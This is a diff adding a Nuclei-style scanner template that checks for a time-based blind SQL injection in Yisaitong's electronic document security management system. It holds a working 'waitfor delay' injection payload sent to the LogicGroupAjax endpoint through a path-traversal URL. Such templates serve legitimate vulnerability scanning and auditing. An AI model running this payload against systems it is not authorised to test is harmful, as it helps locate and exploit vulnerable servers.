@@ -1,0 +1,35 @@
+http:
+- matchers:
+  - dsl:
+    - duration > 5
+    type: dsl
+  - status:
+    - 200
+    type: status
+  raw:
+  - 'POST /CDGServer3/js/../LogicGroupAjax HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
+    like Gecko) Chrome/70.0.3538.77 Safari/537.36
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    command=isExist&logicGroupName=-1''waitfor delay ''0:0:5''--
+
+    '
+id: yisaitong-LogicGroupAjax-sqli123
+info:
+  author: g3m
+  classification:
+    cvss-score: 7.5
+  metadata:
+    max-request: 1
+    product: 电子文档安全管理系统
+    vendor: yisaitong
+    verified: true
+  name: 亿赛通电子文档安全管理系统 LogicGroupAjax SQL注入123
+  severity: high
+  tags: yisaitong,sqli
